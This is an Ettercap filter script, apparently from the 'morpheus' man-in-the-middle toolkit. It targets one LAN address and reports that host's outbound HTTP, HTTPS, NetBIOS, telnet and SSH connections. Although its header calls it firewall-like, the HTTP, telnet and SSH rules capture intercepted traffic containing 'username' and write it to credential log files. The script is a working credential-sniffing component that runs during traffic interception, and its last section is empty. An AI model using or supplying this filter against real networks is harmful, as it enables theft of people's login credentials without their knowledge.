##
#  This filter will act like a firewall reporting OR blocking
#  connections inside Local Lan of the sellected ip address.
#  It also dumps to a [ logfile_creds ] logins captured under
#  mitm + filter execution In services: http,ssh,telnet,ftp...  
##




######################################
## skynet  192.168.1.67 connections ##
######################################
##
# from ME -> OUTSIDE
if (ip.src == '192.168.1.67' && ip.proto == TCP && tcp.dst == 80) {
  msg("[morpheus]  host:192.168.1.67   [ -> ]  port:80 http ☆");
        # log credentials into morpheus/logs/http_creds
        if (regex(DECODED.data, ".*username.*")) {
         log(DECODED.data, "./http_creds");
         msg("[morpheus]  | status: login detected!");
         msg("[morpheus]  |_ credentials found, logfile stored ✔\n");
    }
}
if (ip.src == '192.168.1.67' && ip.proto == TCP && tcp.dst == 443) {
  msg("[morpheus]  host:192.168.1.67   [ -> ]  port:443 https ☆");
}
if (ip.src == '192.168.1.67' && ip.proto == TCP && tcp.dst == 445) {
  msg("[morpheus]  host:192.168.1.67   [ -> ]  port:445 netbios ☠");
}
if (ip.src == '192.168.1.67' && ip.proto == TCP && tcp.dst == 139) {
  msg("[morpheus]  host:192.168.1.67   [ -> ]  port:139 netbios ☠");
}
if (ip.src == '192.168.1.67' && ip.proto == UDP && udp.dst == 137) {
  msg("[morpheus]  host:192.168.1.67   [ -> ]  port:137 netbios ☠");
}
if (ip.src == '192.168.1.67' && ip.proto == TCP && tcp.dst == 23) {
  msg("[morpheus]  host:192.168.1.67   [ -> ]  port:23 telnet ☆");
        # log credentials into morpheus/logs/telnet_creds
        if (regex(DECODED.data, ".*username.*")) {
         log(DECODED.data, "./telnet_creds");
         msg("[morpheus]  | status: login detected!");
         msg("[morpheus]  |_ credentials found, logfile stored ✔\n");
    }
}
if (ip.src == '192.168.1.67' && ip.proto == TCP && tcp.dst == 22) {
  msg("[morpheus]  host:192.168.1.67   [ -> ]  port:22 ssh ☆");
        # log credentials into morpheus/logs/ssh_creds
        if (regex(DECODED.data, ".*username.*")) {
         log(DECODED.data, "./ssh_creds");
         msg("[morpheus]  | status: login detected!");
         msg("[morpheus]  |_ credentials found, logfile stored...\n");
    }
}


##
# from OUTSIDE -> ME
